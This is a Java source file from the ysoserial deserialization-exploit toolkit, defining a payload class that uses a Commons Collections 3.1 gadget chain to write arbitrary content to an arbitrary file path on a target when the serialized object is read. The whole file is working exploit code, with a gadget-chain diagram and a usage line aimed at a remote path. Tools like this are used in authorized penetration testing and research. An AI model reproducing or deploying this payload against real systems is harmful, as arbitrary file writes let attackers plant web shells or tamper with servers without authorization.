package ysoserial.payloads;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.JavaVersion;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import java.io.BufferedReader;
import java.io.FileReader;
import java.io.FileWriter;
import java.io.IOException;
import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.Map;

/*
	Gadget chain:	
		ObjectInputStream.readObject()
			AnnotationInvocationHandler.readObject()
				Map(Proxy).entrySet()
					AnnotationInvocationHandler.invoke()
						LazyMap.get()
							ChainedTransformer.transform()
								ConstantTransformer.transform()
								InvokerTransformer.transform()
									Method.invoke()				
										Class.getMethod()
								InvokerTransformer.transform()
									Method.invoke()
										Runtime.getRuntime()
								InvokerTransformer.transform()
									Method.invoke()
										Runtime.exec()
	
	Requires:
		commons-collections

	Usage: java -jar ysoserial.jar CommonsCollections1FileWriter /remote/path/file.txt /file/content/to/file.txt
 */
@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-collections:commons-collections:3.1"})
@PayloadTest ( precondition = "isApplicableJavaVersion")
public class CommonsCollections1FileWriter extends PayloadRunner implements ObjectPayload<InvocationHandler> {
	
	public InvocationHandler getObject(final String command) throws Exception {
		// inert chain for setup
		final Transformer transformerChain = new ChainedTransformer(
			new Transformer[]{ new ConstantTransformer(1) });
		// real chain for after setup


		String[] commandParts = command.split("\\s",2);
		String fileName = commandParts[0];
		String content = commandParts.length == 2 ? commandParts[1] : "Hello World!" ;

		System.err.println("Filename : " + fileName);
		System.err.println("Content : " + fileToString(content));

		final Transformer[] transformers = new Transformer[] {
				new ConstantTransformer(FileWriter.class),
				new InstantiateTransformer(new Class[] { String.class }, new Object[] {fileName} ),
				new InvokerTransformer("append", new Class[] {CharSequence.class}, new Object[] {fileToString(content)} ),
				new InvokerTransformer("flush", new Class[0], new Object[0])};


		final Map innerMap = new HashMap();

		final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
		
		final Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);
		
		final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);
		
		Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain	
				
		return handler;
	}
	
	public static void main(String[] args) throws Exception {
		PayloadRunner.run(CommonsCollections1FileWriter.class, args);
	}

	public String fileToString(String path) throws IOException {
		BufferedReader br = new BufferedReader(new FileReader(path));
		StringBuilder sb = new StringBuilder();

		try {
			String line = br.readLine();

			while (line != null) {
				sb.append(line);
				sb.append("\n");
				line = br.readLine();
			}
		} finally {
			br.close();
		}
		return sb.toString();
	}
	
	public static boolean isApplicableJavaVersion() {
        return JavaVersion.isAnnInvHUniversalMethodImpl();
    }
}
